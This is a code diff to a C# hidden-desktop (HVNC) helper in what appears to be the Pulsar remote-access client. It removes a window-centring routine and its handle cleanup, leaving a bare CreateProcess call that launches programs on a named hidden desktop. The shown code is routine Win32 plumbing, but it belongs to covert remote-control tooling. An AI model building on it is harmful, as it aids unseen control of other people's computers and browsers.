@@ -1,5 +1,4 @@
 ﻿using Microsoft.Win32;
-using Pulsar.Client.Helper;
 using Pulsar.Client.Helper.HVNC.Chromium;
 using System;
 using System.Diagnostics;
@@ -7,7 +6,6 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -19,38 +17,7 @@ namespace Pulsar.Client.Helper.HVNC
         }
 
         [DllImport("kernel32.dll")]
-    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
-
-    [DllImport("user32.dll")]
-    private static extern uint WaitForInputIdle(IntPtr hProcess, uint dwMilliseconds);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern bool CloseHandle(IntPtr hObject);
-
-    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
-
-    [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
-
-    [DllImport("user32.dll")]
-    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
-
-    [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
-
-    [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool IsWindowVisible(IntPtr hWnd);
-
-    [DllImport("user32.dll")]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-
-    private const uint SWP_NOSIZE = 0x0001;
-    private const uint SWP_NOZORDER = 0x0004;
-    private const uint SWP_NOACTIVATE = 0x0010;
+        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
@@ -234,7 +201,7 @@ namespace Pulsar.Client.Helper.HVNC
                 Debug.WriteLine("Error starting Opera: " + ex.Message);
             }
         }
-        
+
         public void StartOperaGX()
         {
             try
@@ -384,123 +351,10 @@ namespace Pulsar.Client.Helper.HVNC
             structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
             structure.lpDesktop = this.DesktopName;
             PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
-            bool created = CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
-
-            if (created)
-            {
-                CenterProcessWindowAsync(process_INFORMATION);
-            }
-            else
-            {
-                if (process_INFORMATION.hProcess != IntPtr.Zero)
-                {
-                    CloseHandle(process_INFORMATION.hProcess);
-                }
-
-                if (process_INFORMATION.hThread != IntPtr.Zero)
-                {
-                    CloseHandle(process_INFORMATION.hThread);
-                }
-            }
-
-            return created;
+            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
         }
 
         private string DesktopName;
-
-        private void CenterProcessWindowAsync(PROCESS_INFORMATION processInfo)
-        {
-            Task.Run(() =>
-            {
-                try
-                {
-                    if (processInfo.hProcess == IntPtr.Zero)
-                    {
-                        return;
-                    }
-
-                    WaitForInputIdle(processInfo.hProcess, 5000);
-
-                    IntPtr targetWindow = IntPtr.Zero;
-                    for (int attempt = 0; attempt < 40 && targetWindow == IntPtr.Zero; attempt++)
-                    {
-                        targetWindow = FindWindowForProcess(processInfo.dwProcessId);
-                        if (targetWindow == IntPtr.Zero)
-                        {
-                            Thread.Sleep(250);
-                        }
-                    }
-
-                    if (targetWindow == IntPtr.Zero)
-                    {
-                        return;
-                    }
-
-                    if (!GetWindowRect(targetWindow, out RECT windowRect))
-                    {
-                        return;
-                    }
-
-                    int windowWidth = windowRect.Right - windowRect.Left;
-                    int windowHeight = windowRect.Bottom - windowRect.Top;
-
-                    var bounds = ScreenHelperCPU.GetBounds(0);
-                    int centeredX = bounds.Left + Math.Max((bounds.Width - windowWidth) / 2, 0);
-                    int centeredY = bounds.Top + Math.Max((bounds.Height - windowHeight) / 2, 0);
-
-                    SetWindowPos(targetWindow, IntPtr.Zero, centeredX, centeredY, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Failed to center HVNC process window: {ex.Message}");
-                }
-                finally
-                {
-                    if (processInfo.hThread != IntPtr.Zero)
-                    {
-                        CloseHandle(processInfo.hThread);
-                    }
-
-                    if (processInfo.hProcess != IntPtr.Zero)
-                    {
-                        CloseHandle(processInfo.hProcess);
-                    }
-                }
-            });
-        }
-
-        private static IntPtr FindWindowForProcess(int processId)
-        {
-            IntPtr target = IntPtr.Zero;
-
-            EnumWindows((hWnd, _) =>
-            {
-                if (!IsWindowVisible(hWnd))
-                {
-                    return true;
-                }
-
-                GetWindowThreadProcessId(hWnd, out uint windowProcessId);
-                if (windowProcessId != (uint)processId)
-                {
-                    return true;
-                }
-
-                target = hWnd;
-                return false;
-            }, IntPtr.Zero);
-
-            return target;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct RECT
-        {
-            public int Left;
-            public int Top;
-            public int Right;
-            public int Bottom;
-        }
 
         private struct STARTUPINFO
         {
